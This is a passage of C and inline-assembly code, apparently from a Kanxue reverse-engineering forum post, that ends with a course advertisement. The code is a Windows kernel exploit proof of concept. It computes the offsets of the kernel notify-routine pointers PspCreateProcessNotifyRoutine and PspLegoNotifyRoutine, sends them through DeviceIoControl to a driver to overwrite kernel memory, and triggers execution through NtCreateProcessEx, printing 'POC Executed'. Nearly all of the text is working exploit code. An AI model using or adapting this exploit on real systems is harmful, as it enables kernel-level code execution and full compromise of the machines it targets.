
```
printf("bad PsSetCreateProcessNotifyRoutine!\n");

return 0 ;

}
```
`PIMAGE_DOS_HEADER` `doshdr` ;

`PIMAGE_NT_HEADERS` `nthdr` ;

`doshdr` = (`PIMAGE_DOS_HEADER`) (`hkernel`);

`nthdr` = (`PIMAGE_NT_HEADERS`) ((`ULONG`)`hkernel` + `doshdr->e_lfanew`);

`PspLegoNotifyRoutine` += (`ULONG`)`pModInfo->Module[0].Base` - `nthdr->OptionalHeader.ImageBase`;

`PspCreateProcessNotifyRoutine` += (`ULONG`)`pModInfo->Module[0].Base` - `nthdr->OptionalHeader.ImageBase`;

`FreeLibrary`(`hkernel`);

`ULONG` `PspLegoNotifyRoutineOff` = (`ULONG`)`PspLegoNotifyRoutine` - (`ULONG`)`pModInfo->Module[0].Base` ;

`ULONG` `PspCreateProcessNotifyRoutineOff` = (`ULONG`)`PspCreateProcessNotifyRoutine` - (`ULONG`)`pModInfo->Module[0].Base`;

`ULONG` `btr` ;

`ULONG` `InputBuffer[3]` = {`0x0` , `PspCreateProcessNotifyRoutineOff` , `PspLegoNotifyRoutineOff` };

if (!`DeviceIoControl`(`hDev` ,

  `0x800001A4`,

  &`InputBuffer` ,

  sizeof(`ULONG`)*3 ,

  NULL,

  0,

  &`btr` ,

  0))

{

  `printf`("device io control failed %u\n", `GetLastError`());

  return 0 ;

}

`PVOID` `pNtCreateProcessEx` = `GetProcAddress`(`GetModuleHandle`("ntdll.dll") , "NtCreateProcessEx");

`HANDLE` `hProc` ;

```asm
push 0
push 0
push 0
push 0
push 0
push 0x1
push 0
push 0
lea eax ,hProc
push eax
call pNtCreateProcessEx
```

`ULONG` `ThreadLegoDataOff` = `ThreadObject` - (`ULONG`)`pModInfo->Module[0].Base` ;

`InputBuffer[2]` = `ThreadLegoDataOff`;

if (!`DeviceIoControl`(`hDev` ,

  `0x800001A4`,

  &`InputBuffer` ,

  sizeof(`ULONG`)*3 ,

  NULL,

  0,

  &`btr` ,

  0))

{

  `printf`("device io control failed %u\n", `GetLastError`());

  return 0 ;

}

```asm
push 0
    push 0
    push 0
    push 0
    push 0
    push 0x1
    push 0
    push 0
    lea eax ,hProc
    push eax
    call pNtCreateProcessEx
```

`TerminateThread`(`hThread` , 0 );

`printf`("POC Executed\n");

`getchar`();

return 0;

}

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
